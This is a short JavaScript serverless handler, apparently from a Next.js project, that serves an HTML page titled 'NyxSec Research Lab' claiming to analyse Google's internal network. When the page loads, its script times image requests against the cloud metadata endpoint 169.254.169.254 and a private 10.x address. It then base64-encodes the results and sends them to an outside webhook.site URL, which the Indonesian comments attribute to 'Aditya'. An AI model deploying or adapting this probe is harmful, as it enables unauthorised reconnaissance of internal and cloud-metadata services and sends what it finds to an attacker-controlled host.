export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>NyxSec Research Lab</title></head>
      <body>
        <pre>Status: Analyzing Google Internal Network Architecture...</pre>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";

          async function probeTarget(targetName, url) {
            const start = Date.now();
            return new Promise((resolve) => {
              const img = new Image();
              
              // Timeout 5 detik: Jika lewat, berarti paket di-drop (Filtered/Silent)
              const timer = setTimeout(() => {
                img.src = ""; 
                resolve({ target: targetName, time: Date.now() - start, status: "timeout" });
              }, 5000);

              img.onload = img.onerror = () => {
                clearTimeout(timer);
                resolve({ target: targetName, time: Date.now() - start, status: "finished" });
              };

              // Cache-busting unik per request
              img.src = url + "?v=" + Math.random();
            });
          }

          async function runTest() {
            const results = [];
            
            // 1. Target Metadata (IP Link-Local)
            results.push(await probeTarget("METADATA", "http://169.254.169.254/computeMetadata/v1/instance/hostname"));
            
            // 2. Target Baseline (IP Private yang kemungkinan besar mati)
            results.push(await probeTarget("DEAD_IP", "http://10.255.255.1/"));

            // Kirim komparasi data ke Webhook Aditya
            fetch(webhook + "?results=" + btoa(JSON.stringify(results)));
          }

          runTest();
        </script>
      </body>
    </html>
  `);
}
